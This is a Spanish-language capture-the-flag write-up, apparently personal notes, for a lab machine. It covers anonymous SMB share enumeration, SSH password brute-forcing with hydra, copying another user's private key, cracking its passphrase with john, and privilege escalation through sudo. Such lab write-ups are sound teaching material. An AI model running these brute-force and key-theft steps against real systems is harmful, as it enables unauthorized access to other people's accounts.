
---
 
 Mediante el escaneo de puertos podemos obtener los siguientes puertos de escaneo asi como los puertos 8000 y 8080 en los cuales corre un servidor tomcat en una versión no vulnerable :

![[Pasted image 20251027165523.png]]

- En donde podemos ver que en el puerto 445 corre una versión de samba en la cual podemos enumerar usuarios 

*Enumerar los recursos compartidos de la red a traves del protocolo smb* [[p445 - SAMBA]]
```bash
smbclient -L <Ipvictima> -N     # Enumerar recursos compartidos sin credenciales -N = nullsession
smbclient //<Ipvictima>/<RecursoCompartido> -N # Acceder al recurso sin tener contraseña
```

- De esta forma accedemos al recurso compartido de nombre *Anonymous* en la cual se encuentra un archivo llamado staff.txt 

```bash
smb > 
	get staff.txt    # Descargamos el archivo a nuestra maquina local
```

- El archivo contiene 2 usuarios en los cuales aparece *kay* y *Jan*

![[Pasted image 20251027165904.png]]


- Con esto nos da indicios de realizar un ataque de fuerza bruta por lo que probamos con ambos usuarios por el puerto ssh de la siguiente forma:

```bash
hydra -l jan -P /usr/share/wordlist/rockyou.txt ssh://<IpVictima>   # La contraseña esta en lineas finales del rockyou por lo que hay que esperar
```

- Con el usuario de *jan* obtenemos la contraseña que es *armando* y podemos acceder mediante ssh, una vez estando en la consola procedemos a verificar todos los procesos de escalada de privilegios pero no hay ninguno activo, sin embargo vemos que tenemos permisos de ejecución en la carpeta de *kay* por lo que podemos acceder a ella de la siguiente forma:

```bash
cd /home/kay    # Vemos la carpeta de kay
ls -la          # Listamos todos los permisos y ademas las carpetas ocultas
cd .ssh         # Accedemos a la carpeta oculta de .ssh donde muchas veces se encuentran alojadas claves privadas
cat id_rsa      # Vemos la clave privada de kay por la que la copiamos
```

- Con la clave privada de kay , procedemos a realizar la suplantación en nuestra maquina local:

```bash
nano id_rsa  # Nos creamos un archivo y pegamos la clave privada que habiamos copiado
ssh2john id_rsa > hash     # Extraemos el hash que tiene la clave privada
john hash --wordlist=/usr/share/wordlist/rockyou.txt   # Rompemos el hash extrayendo el passprhase de la clave privada el cual es "beeswax"
chmod +600 id_rsa   # Le damos los permisos de una clave privada a nuestro archivo

ssh kay@<Ipvictima> -i id_rsa   # Accedemos mediante la clave privada por ssh y escribimos "beeswax" cuando nos pidan las passprhase
```

- Una vez estando en el perfil de kay vemos que con el comando *sudo -l* tenemos permisos de root en todos los binarios así que escogemos cualquiera y mediante GTFobins escalamos privilegios  

